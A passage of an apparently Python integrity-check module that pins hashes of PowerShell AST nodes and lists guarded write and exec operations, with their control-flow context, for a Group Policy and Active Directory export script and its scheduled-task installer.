        "35": "1f1b1d02ed9d3ef878c9822c14dd04fab6f44a9967dc16df750746a341550e7d",
        # [4/1/0] IfStatementAst: PSCmdlet
        "36": "c409854057df5e079d8383c312c3f05af8de14327166abac538f7590f1ecff06",
        # [4/1/0/0] PipelineAst: Unregister-ScheduledTask
        "37": "76134bb3603269e2c51e141e5f9c6677c2436fd0b5ef910e8d79dc9f329667be",
        # [4/1/0/1] PipelineAst: Write-Host
        "38": "fae86fe93566c55d331ec036502f35a8dcec4d3124291c9dd1f820d3b15cb7a8",
        # [4/1/1] ReturnStatementAst:
        "39": "6e6746dffbb548873b35171401118f89ee86d15e33675b92982f74752b9bb1c7",
        # [4/2] AssignmentStatementAst: scheduleTime
        "40": "dd12dcba80059aafd485ed241ff52bf5e38e51c3c9021abac3f84b76f8503492",
        # [4/3] IfStatementAst: TryParseExact
        "41": "c3ffc8aab61b336b114471e0bf8eaf968ed4b9de774ae22b8185bdcbda482d87",
        # [4/3/0] ThrowStatementAst: -At must use HH:mm (24-hour local time).
        "42": "e46206efb4ede58893e14d92939a2942d22723f71ceb489f37f204157f70c8a4",
        # [4/4] AssignmentStatementAst: CollectorPath
        "43": "f548009a4c0b73110003d31751ccad549fe352451da51358259398fad0bd03a0",
        # [4/5] AssignmentStatementAst: runner
        "44": "c50269e4a494755ab9527e8bcb3aec58927b034780b9af073dacf1dfdb6524e3",
        # [4/6] AssignmentStatementAst: OutputRoot
        "45": "436d721012e21a907d97ee39792ae4f6b65da0f18f6ee7d57a72ff129b47b13c",
        # [4/7] AssignmentStatementAst: taskArgs
        "46": "a6937ce0ec101b35c7fe8273c66f98a559edf40d9cc36e643b8adfcfea28c5ee",
        # [4/8] IfStatementAst: CopyTo
        "47": "dc8a2069e0e6c9bd13a77895fb260b57289e677dfe65b514ea63cf811776af0c",
        # [4/8/0] AssignmentStatementAst: taskArgs
        "48": "2fd129bdc4c968d7c82c04fb31802f6a3961c118b664c8e61be4da6b5cc17d66",
        # [4/9] IfStatementAst: InventoryPath
        "49": "414341786d351e61a83a539fa8aa77f181dadddc00c7d744601ed8d646b88849",
        # [4/9/0] AssignmentStatementAst: taskArgs
        "50": "1d50ad881b46fcacd9d18f4fe2b98f4465299a8304d861e8cb69400e2226a583",
        # [4/10] AssignmentStatementAst: account
        "51": "54bc406d604c6ed479f6998d2b02e9e5504c961a653a1f67d708e3b1cd28d762",
        # [4/10/0] PipelineAst: GmsaAccount
        "52": "da28f1d21757eba0906919ddb5efc5ddce0d29eabf4946e06a4414db4b9c9d9f",
        # [4/10/0] PipelineAst: ServiceAccount
        "53": "98369b47240aad7e382f6ebf0f2db2bf4e9a16c72abc8f9c2361d64b4bb70920",
        # [4/11] IfStatementAst: PSCmdlet
        "54": "e96847387215f54c0e621c69bf383f4077f30c520c7623b36a4a67ab69aa98bb",
        # [4/11/0] ReturnStatementAst:
        "55": "6e6746dffbb548873b35171401118f89ee86d15e33675b92982f74752b9bb1c7",
        # [4/12] AssignmentStatementAst: principal
        "56": "abd7b92dc73ea3a9b5364e4c126349ed360d07799b40382ab30c32df75c4ea14",
        # [4/13] AssignmentStatementAst: windowsRoot
        "57": "3a2fe69c7aaa46b9838821a96203723c3b52c292af7b0b3b0fc80df7f72ec706",
        # [4/13/0] PipelineAst: env:SystemRoot
        "58": "258dc90ea08567ea8f44ba115bc60a3d2441c1c4de26abbc2de47fb72925e50b",
        # [4/13/0] PipelineAst: C:\Windows
        "59": "9a2d7116cf8ec44dc2ef86cff11c9d39fb58187eb5906fcc68a28381081e3640",
        # [4/14] AssignmentStatementAst: action
        "60": "3b968b75eeec69cc4bf4128a640ffbf2ddf0be754793d540307c2edaa0eeaaa4",
        # [4/15] AssignmentStatementAst: trigger
        "61": "5cd341082d0116759568a6461fb0c39f7665aee58276c20996fbdda1c70018c8",
        # [4/16] AssignmentStatementAst: settings
        "62": "7f3351c7c49de694c63083f53200901c0f7184864198470f9f129b16be98f5be",
        # [4/17] AssignmentStatementAst: task
        "63": "0a58c92b2fb43900ec646bfab501f1155642a2889398d490b91eea31c3ce5e94",
        # [4/18] IfStatementAst: GmsaAccount
        "64": "3a2f8f5411d5e27955c2170a40318261adef909217281c065487c6b79cbb4bc4",
        # [4/18/0] IfStatementAst: Credential
        "65": "0237230ef6a8b2b6d457a784efc672137b3d7431b4aee45199e96b0c73eae326",
        # [4/18/0/0] AssignmentStatementAst: Credential
        "66": "4e0e1b57a41b054fd0111ad7de5317d7a29eefac403c6c844f0db813bcb70bea",
        # [4/18/1] IfStatementAst: Credential
        "67": "6f2eb09a50fd1b6e4a246dd03cfc589101f67c8229acb689e0b4a4dc1b7813aa",
        # [4/18/1/0] ThrowStatementAst: Credential username must match -ServiceAccount.
        "68": "9d9e0d3ad1822870fbfd35cfb26311186a6dff447b0cf7757241e5eedb2c1755",
        # [4/18/2] AssignmentStatementAst: taskPassword
        "69": "daccf91ca685bcf31249310dac89c477b59144c7384c6749d2380b24424c5cac",
        # [4/19] TryStatementAst: Set-GpoLensCollectionOwner
        "70": "a601591d4afb5f5d182620a4d77d3ddb01299c0de2d7bf059f4a2962d0011572",
        # [4/19/0] PipelineAst: Set-GpoLensCollectionOwner
        "71": "77a36e47f62028e0013b00c5850f0a88a67223ac03b654cbd4d2297b85a2364b",
        # [4/19/0/0] IfStatementAst: GmsaAccount
        "72": "7d164ab234c276810d14a9a9de89ba14a7ae3b0cc4150284a1f2f3de93c89f9b",
        # [4/19/0/0/0] PipelineAst: Register-ScheduledTask
        "73": "2f42594c9a2f15413ac6695df1177f96e0ca75ae2d03f4d4ab9ea10549d367d9",
        # [4/19/0/0/0] PipelineAst: Register-ScheduledTask
        "74": "b19d538d6a315f0f88c3168da80af0100a4cde70a3c6ceff5f32f74be40fc9f2",
        # [4/19/0] AssignmentStatementAst: taskPassword
        "75": "c7a6c091a929ae082cb00e94d79c81ae4c0ed9ac015d1d9f04c0eced2990b896",
        # [4/19/1] AssignmentStatementAst: Credential
        "76": "44d8c28071d29076d800c2486b1fd9b885bd505bb6855601a7bd973f5e0d8f16",
        # [4/20] PipelineAst: Write-Host
        "77": "e42cf2acbb44ecfd03c13b795d3f407d180dceb3103a096a4f9b8d9c546596dd",
        # [4/21] PipelineAst: Write-Host
        "78": "4c8f4c666d2c67c77310c535730340340d9503d7ac2b9f29a93e291b15fc8c5b",
        # [4/22] PipelineAst: Write-Host
        "79": "d778937bb03b9ef76d8805bf0e6bc2f34609937474109898c912451e277896db",
        # [4/23] PipelineAst: Write-Host
        "80": "88532d073a7ed58ebfe19ef8b23fb5ea7c05c7f298ff880c3f72649a094c260c",
        # [4/23/0] PipelineAst: Join-Path
        "81": "5059d590b95c984e189ab7a9b29d4faf31a17d24088c2e9fb17f717cbb7039ee",
        # [4/24] IfStatementAst: CopyTo
        "82": "2707594fa9bcaa1cf6ca66a89b08a9d37889f8d6cc7050a484abba71fb338e42",
        # [4/24/0] PipelineAst: Write-Host
        "83": "9babcd495afab8ca0ddfcf0a317689450eb0f4783d5c399f2e3e45f37d095145",
        # [4/25] PipelineAst: Write-Host
        "84": "7f50d76d6d0d9bdf1857d32c9d57a7773ffcff4d00b0bc9f7ae70979d05fcf01",
    },
}


# Pinned write/exec operations with their control-flow context (see
# check_guarded_ops). Each entry is (normalized operation text, context from
# outermost to innermost).
GUARDED_OPS: dict[str, tuple[tuple[str, tuple[str, ...]], ...]] = {
    "Export-GpoEstate.ps1": (
        (
            "Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop",
            ("function New-GpoExportZip",),
        ),
        (
            "Test-Path -LiteralPath $archive",
            (
                "function New-GpoExportZip",
                "try",
                "if-condition after []",
            ),
        ),
        (
            "Remove-Item -LiteralPath $archive -Force -ErrorAction Stop",
            (
                "function New-GpoExportZip",
                "try",
                "if (Test-Path -LiteralPath $archive) after []",
            ),
        ),
        (
            (
                "Get-ChildItem -LiteralPath $ExportPath -Recurse -File ` -ErrorAction "
                "SilentlyContinue -ErrorVariable +zipEnumErr"
            ),
            (
                "function New-GpoExportZip",
                "try",
            ),
        ),
        (
            'Write-Host "Done: $archive ($($diskFiles.Count) files)"',
            (
                "function New-GpoExportZip",
                "try",
                "guard if ($zipEnumErr) -> throw",
            ),
        ),
        (
            "Test-Path -LiteralPath $archive",
            (
                "function New-GpoExportZip",
                "catch []",
                "if-condition after []",
            ),
        ),
        (
            "Remove-Item -LiteralPath $archive -Force -ErrorAction Stop",
            (
                "function New-GpoExportZip",
                "catch []",
                "if (Test-Path -LiteralPath $archive) after []",
            ),
        ),
        (
            "Get-Module -ListAvailable -Name $mod",
            (
                "foreach ($mod in @('GroupPolicy','ActiveDirectory'))",
                "if-condition after []",
            ),
        ),
        (
            "Write-Error \"Required module '$mod' is not available. Install RSAT.\"",
            (
                "foreach ($mod in @('GroupPolicy','ActiveDirectory'))",
                "if (-not (Get-Module -ListAvailable -Name $mod)) after []",
            ),
        ),
        (
            "Test-Path -LiteralPath $OutputRoot",
            (
                "try",
                "if-condition after []",
            ),
        ),
        (
            "New-Item -ItemType Directory -Force -Path $OutputRoot",
            (
                "try",
                "if (-not (Test-Path -LiteralPath $OutputRoot)) after []",
            ),
        ),
        (
            "Out-Null",
            (
                "try",
                "if (-not (Test-Path -LiteralPath $OutputRoot)) after []",
            ),
        ),
        (
            'Join-Path $OutputRoot "_writetest_.tmp"',
            ("try",),
        ),
        (
            "Remove-Item $testFile -Force",
            ("try",),
        ),
        (
            "Write-Error \"OutputRoot '$OutputRoot' is not writable: $($_.Exception.Message)\"",
            ("catch []",),
        ),
        (
            "Get-ADDomain",
            (),
        ),
        (
            'Get-Date -Format "yyyyMMdd-HHmmss"',
            (),
        ),
        (
            'Join-Path $OutputRoot "$($dom.DNSRoot)-$stamp"',
            (),
        ),
        (
            "Get-GPO -All",
            (),
        ),
        (
            "Get-ADOrganizationalUnit -Filter *",
            (),
        ),
        (
            (
                "Get-ADObject -Filter \"objectClass -eq 'msWMI-Som'\" -Properties "
                "'msWMI-Name' -ErrorAction SilentlyContinue"
            ),
            (),
        ),
        (
            (
                "Get-ADObject -SearchBase "
                '"CN=Sites,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter '
                '"(objectClass=site)" -ErrorAction SilentlyContinue'
            ),
            (),
        ),
        (
            "Get-ADRootDSE",
            (),
        ),
        (
            "Get-ChildItem $src -Recurse -File -ErrorAction SilentlyContinue",
            (
                "if ($DryRun) after []",
                "if (-not $SkipSysvol) after []",
            ),
        ),
        (
            "Measure-Object -Property Length -Sum",
            (
                "if ($DryRun) after []",
                "if (-not $SkipSysvol) after []",
            ),
        ),
        (
            'Write-Host "DryRun: would export the following:"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " Domain: $($dom.DNSRoot)"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " GPOs: $gpoCount"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " OUs: $ouCount"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " WMI filters: $wmiCount"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " AD sites: $siteCount"',
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " Output dir: $out"',
            ("if ($DryRun) after []",),
        ),
        (
            "Write-Host \" SYSVOL: $(if ($SkipSysvol) {'skipped'} else {$sysvolSizeStr})\"",
            ("if ($DryRun) after []",),
        ),
        (
            'Write-Host " Zip: $(if ($NoZip) {\'skipped\'} else {"$out.zip"})"',
            ("if ($DryRun) after []",),
        ),
        (
            "New-Item -ItemType Directory -Force -Path (Join-Path $out 'reports')",
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Join-Path $out 'reports'",
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Out-Null",
            ("guard if ($DryRun) -> return",),
        ),
        (
            'Write-Host "Exporting $($dom.DNSRoot) -> $out"',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Write-Progress -Activity $Activity -PercentComplete $pct",
            (
                "guard if ($DryRun) -> return",
                "function Set-SectionProgress",
            ),
        ),
        (
            'Set-SectionProgress -Activity "GPO settings (XML reports)" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            (
                "Get-GPOReport -All -ReportType Xml -Path (Join-Path $out 'AllGPOs.xml') "
                "-ErrorAction Stop"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'AllGPOs.xml'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Warning "Combined GPO report failed: $($_.Exception.Message)"',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            (
                'Write-Progress -Activity "GPO settings (XML reports)" ` -Status "$i / '
                '$gpoCount" -PercentComplete ([math]::Round(($sectionNum - 1 + ($i / '
                "$gpoCount)) / $totalSections * 100))"
            ),
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
            ),
        ),
        (
            (
                "Get-GPOReport -Guid $gpo.Id -ReportType Xml ` -Path (Join-Path $out "
                '"reports\\${safe}__$($gpo.Id).xml") -ErrorAction Stop'
            ),
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "try",
            ),
        ),
        (
            'Join-Path $out "reports\\${safe}__$($gpo.Id).xml"',
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "try",
            ),
        ),
        (
            (
                "Write-Warning \"GPO report failed for '$($gpo.DisplayName)' ($($gpo.Id)): "
                '$($_.Exception.Message)"'
            ),
            (
                "guard if ($DryRun) -> return",
                "foreach ($gpo in $allGpos)",
                "catch []",
            ),
        ),
        (
            (
                "Get-ADObject -SearchBase $policiesDN -LDAPFilter "
                '"(objectClass=groupPolicyContainer)" ` -Properties displayName -ErrorAction '
                "Stop"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            (
                "ForEach-Object { [pscustomobject]@{ Id = $_.Name.Trim('{}'); DisplayName = "
                "$_.displayName } }"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'gpo-inventory.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'gpo-inventory.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            (
                'Write-Warning "Inaccessible GPO detected: $guid$(if ($gpc.displayName) { " '
                '($($gpc.displayName))" })"'
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gpc in $allGpc)",
                "if (-not $knownIds.Contains($guid)) after []",
            ),
        ),
        (
            'Write-Warning "GPC completeness cross-check failed: $($_.Exception.Message)"',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "if ($collectionErrors.Count -eq 0) after []",
            ),
        ),
        (
            "Join-Path $out 'collection-errors.json'",
            (
                "guard if ($DryRun) -> return",
                "if ($collectionErrors.Count -eq 0) after []",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "else of [($collectionErrors.Count -eq 0)]",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "else of [($collectionErrors.Count -eq 0)]",
            ),
        ),
        (
            "Join-Path $out 'collection-errors.json'",
            (
                "guard if ($DryRun) -> return",
                "else of [($collectionErrors.Count -eq 0)]",
            ),
        ),
        (
            'Set-SectionProgress -Activity "GPO metadata" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            (
                "Select-Object DisplayName, Id, GpoStatus, CreationTime, ModificationTime, "
                "@{n='UserDSVersion';e={$_.User.DSVersion}}, "
                "@{n='UserSysvolVersion';e={$_.User.SysvolVersion}}, "
                "@{n='ComputerDSVersion';e={$_.Computer.DSVersion}}, "
                "@{n='ComputerSysvolVersion';e={$_.Computer.SysvolVersion}}, "
                "@{n='WmiFilter';e={$_.WmiFilter.Name}}"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'gpo-metadata.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'gpo-metadata.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Set-SectionProgress -Activity "Inheritance (gp-inheritance)" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Get-ADOrganizationalUnit -Filter *",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Select-Object -Expand DistinguishedName",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Get-GPInheritance -Target $t",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "try",
            ),
        ),
        (
            "Select-Object DisplayName, GpoId, Enabled, Enforced, Order, Target",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "try",
            ),
        ),
        (
            'Write-Warning "GPInheritance failed for $t : $($_.Exception.Message)"',
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($t in $targets)",
                "catch []",
            ),
        ),
        (
            "ConvertTo-Json -Depth 6",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'gp-inheritance.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'gp-inheritance.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Set-SectionProgress -Activity "OU tree" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Get-ADOrganizationalUnit -Filter * -Properties gPLink, gPOptions",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Select-Object DistinguishedName, Name, gPLink, gPOptions",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'ou-tree.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'ou-tree.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Set-SectionProgress -Activity "AD sites" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Get-ADRootDSE",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            (
                'Get-ADObject -SearchBase "CN=Sites,$configNC" -LDAPFilter '
                '"(objectClass=site)" ` -Properties gPLink, gPOptions, name'
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Select-Object DistinguishedName, Name, gPLink, gPOptions",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'sites.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'sites.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Set-SectionProgress -Activity "WMI filters" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            (
                "Get-ADObject -Filter \"objectClass -eq 'msWMI-Som'\" -Properties "
                "'msWMI-Name', 'msWMI-Parm2'"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Select-Object @{n='Name';e={$_.'msWMI-Name'}}, @{n='Query';e={$_.'msWMI-Parm2'}}",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'wmi-filters.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'wmi-filters.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Set-SectionProgress -Activity "Principals (SID -> name)" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            (
                "Get-ChildItem -LiteralPath (Join-Path $out 'reports') -Filter '*.xml' "
                "-ErrorAction SilentlyContinue"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'reports'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'AllGPOs.xml'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Test-Path -LiteralPath $allXmlPath",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if-condition after []",
            ),
        ),
        (
            "Get-Item -LiteralPath $allXmlPath",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if (Test-Path -LiteralPath $allXmlPath) after []",
            ),
        ),
        (
            "Get-Content -LiteralPath $f.FullName -Raw -ErrorAction Stop",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($f in $xmlFiles)",
                "try",
            ),
        ),
        (
            "Join-Path $out 'gpo-metadata.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Test-Path -LiteralPath $metaPath",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if-condition after []",
            ),
        ),
        (
            "Get-Content -LiteralPath $metaPath -Raw",
            (
                "guard if ($DryRun) -> return",
                "try",
                "if (Test-Path -LiteralPath $metaPath) after []",
                "try",
            ),
        ),
        (
            'Write-Host " Found $($allSids.Count) unique SIDs to resolve"',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Sort-Object",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($sid in ($allSids | Sort-Object))",
            ),
        ),
        (
            "New-Object System.Security.Principal.SecurityIdentifier($sid)",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($sid in ($allSids | Sort-Object))",
                "try",
            ),
        ),
        (
            "Where-Object { $_ -match '^S-1-5-21-' -and $principals[$_].type -eq 'Unresolved' }",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Host " Resolving $($domainSids.Count) domain SIDs via Get-ADObject..."',
            (
                "guard if ($DryRun) -> return",
                "try",
                "if ($domainSids.Count -gt 0) after []",
            ),
        ),
        (
            (
                "Get-ADObject -Filter \"objectSid -eq '$sid'\" -Properties objectClass, "
                "sAMAccountName, name -ErrorAction Stop"
            ),
            (
                "guard if ($DryRun) -> return",
                "try",
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                "try",
            ),
        ),
        (
            "Get-Date -Format 'o'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 5",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'principals.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'principals.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Host " Resolved: $resolved, Unresolved: $unresolved"',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Warning "Principals collection failed: $($_.Exception.Message)"',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            'Set-SectionProgress -Activity "Group membership" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Where-Object { $principals[$_].type -eq 'Group' }",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Host " Expanding $($groupSids.Count) groups..."',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Get-ADGroupMember -Identity $gSid -Recursive -ErrorAction Stop",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gSid in $groupSids)",
                "try",
            ),
        ),
        (
            "ForEach-Object { $_.SID.Value }",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gSid in $groupSids)",
                "try",
            ),
        ),
        (
            "Get-Date -Format 'o'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "ConvertTo-Json -Depth 5",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'group-members.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "Join-Path $out 'group-members.json'",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Host " Expanded: $groupsExpanded, Failed: $groupsFailed"',
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            'Write-Warning "Group membership collection failed: $($_.Exception.Message)"',
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            'Set-SectionProgress -Activity "SYSVOL copy" -Section $sectionNum',
            ("guard if ($DryRun) -> return",),
        ),
        (
            "Join-Path $out 'SYSVOL-Policies'",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            "New-Item -ItemType Directory -Force -Path $dest",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            "Out-Null",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            (
                "Get-ChildItem -LiteralPath $src -Directory ` -ErrorAction SilentlyContinue "
                "-ErrorVariable +srcErr"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            (
                "Copy-Item -LiteralPath $pf.FullName -Destination $dest -Recurse -Force "
                "-ErrorAction Stop"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "try",
            ),
        ),
        (
            (
                'Write-Warning "SYSVOL copy failed for policy folder $($pf.Name): '
                '$($_.Exception.Message)"'
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "catch []",
            ),
        ),
        (
            "Get-ChildItem -LiteralPath $src -File -ErrorAction SilentlyContinue",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            (
                "ForEach-Object { Copy-Item -LiteralPath $_.FullName -Destination $dest -Force "
                "-ErrorAction SilentlyContinue }"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            (
                "Copy-Item -LiteralPath $_.FullName -Destination $dest -Force -ErrorAction "
                "SilentlyContinue"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            "Get-ChildItem -LiteralPath $dest -Recurse -File -ErrorAction SilentlyContinue",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            "Join-Path $out 'collection-errors.json'",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            'Write-Warning "SYSVOL copy produced no files: $detail"',
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
            ),
        ),
        (
            "ConvertTo-Json -Depth 4",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                (
                    "else of [($policyFolders.Count -eq 0 -or $copiedCount -eq 0) ; "
                    "($sysvolErrors -eq 0)]"
                ),
            ),
        ),
        (
            "Set-Content (Join-Path $out 'collection-errors.json') -Encoding UTF8",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                (
                    "else of [($policyFolders.Count -eq 0 -or $copiedCount -eq 0) ; "
                    "($sysvolErrors -eq 0)]"
                ),
            ),
        ),
        (
            "Join-Path $out 'collection-errors.json'",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                (
                    "else of [($policyFolders.Count -eq 0 -or $copiedCount -eq 0) ; "
                    "($sysvolErrors -eq 0)]"
                ),
            ),
        ),
        (
            'Write-Progress -Activity "Export complete" -Completed',
            ("guard if ($DryRun) -> return",),
        ),
        (
            'Write-Host "`nExport summary:`n Succeeded ($($successSections.Count)):"',
            ("guard if ($DryRun) -> return",),
        ),
        (
            'Write-Host " - $s"',
            (
                "guard if ($DryRun) -> return",
                "foreach ($s in $successSections)",
            ),
        ),
        (
            'Write-Host " Failed ($($failedSections.Count)):"',
            (
                "guard if ($DryRun) -> return",
                "if ($failedSections.Count -gt 0) after []",
            ),
        ),
        (
            'Write-Host " - $s"',
            (
                "guard if ($DryRun) -> return",
                "if ($failedSections.Count -gt 0) after []",
